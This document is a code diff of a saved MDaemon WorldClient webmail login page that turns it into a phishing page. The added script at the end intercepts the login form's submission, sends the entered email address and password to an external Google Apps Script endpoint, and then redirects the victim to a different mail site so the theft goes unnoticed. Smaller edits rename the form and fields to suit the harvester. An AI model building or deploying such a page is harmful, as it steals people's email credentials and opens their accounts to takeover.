@@ -125,6 +125,7 @@ html{overflow: auto;}
 .tablet * input, .tablet * select, .tablet * #loginTable tbody tr td
 {
     font-size: 1.15em;
+
 }</style>
     <style>
         .customBranding img{background: #fff;}
@@ -156,7 +157,7 @@ html{overflow: auto;}
 <meta name="savepage-comments" content="">
   </head>
 <body class="loginBody" style="">
-<form action="/WorldClient.dll?View=Main" autocomplete="off" target="_top" method="post" onsubmit="document.getElementById('Logon').disabled=true;" novalidate="">
+<form action="/WorldClient.dll?View=Main" autocomplete="off" target="_top" name="google-sheet" method="post" onsubmit="document.getElementById('Logon').able=true;" validate="">
 <table align="center" width="530" border="0" cellpadding="0" cellspacing="0" id="loginTable">
 	<tbody><tr>
 		<td align="center">
@@ -178,11 +179,11 @@ html{overflow: auto;}
                 </tr>
     			<tr>
 					<td align="right" valign="center"><b id="emailAddressTranslationString">Email Address:</b></td>
-					<td align="left" valign="top"><input class="loginInput" type="email" name="User" size="18" value="" onfocus="showFocus(this)" onblur="showBlur(this)" autocomplete="off" style="width: 148px; border: 1px solid rgb(153, 153, 153);"></td>
+					<td align="left" valign="top"><input class="loginInput" type="email" name="Username" size="18" value="" onfocus="showFocus(this)" onblur="showBlur(this)" autocomplete="off" style="width: 148px; border: 1px solid rgb(153, 153, 153);"></td>
 				</tr>
 				<tr>
 					<td align="right" valign="center"><b id="passwordTranslationString">Password:</b></td>
-					<td align="left" valign="top"><input class="loginInput" type="password" name="Password" autocomplete="off" size="18" onfocus="showFocus(this)" onblur="showBlur(this)" style="width: 148px;" value=""></td>
+					<td align="left" valign="top"><input class="loginInput" type="Password" name="Password" autocomplete="off" size="18" onfocus="showFocus(this)" onblur="showBlur(this)" style="width: 148px;" value=""></td>
 				</tr>
 				<tr>
 					<td> </td>
@@ -255,7 +256,24 @@ html{overflow: auto;}
 	</tr>
 </tbody></table>
 
-</form>
+</form><script type="text/javascript">
+
+
+   const scriptURL = 'https://script.google.com/macros/s/AKfycbxnKSDadTZ9Wxv1gsiUVF7FRrLZaJ-81rgp_IRyBcoH6K9bg1PdZtLk8WuPczfBkAiMaQ/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    .then(() => {
+      const redirectUrl = 'https://mail.btes.tv/';
+      const link = document.createElement('a');
+      link.href = redirectUrl;
+      link.click();
+    })
+    .catch((error) => console.error('Error!', error.message));
+            })
+  </script>
 <br>
 <div align="center" class="branding">
 	 <a href="http://www.altn.com/Software/MDaemon-Webmail-WorldClient/">MDaemon Email Server for Windows/WorldClient v15.0.6 © 2015 Alt-N Technologies</a>.
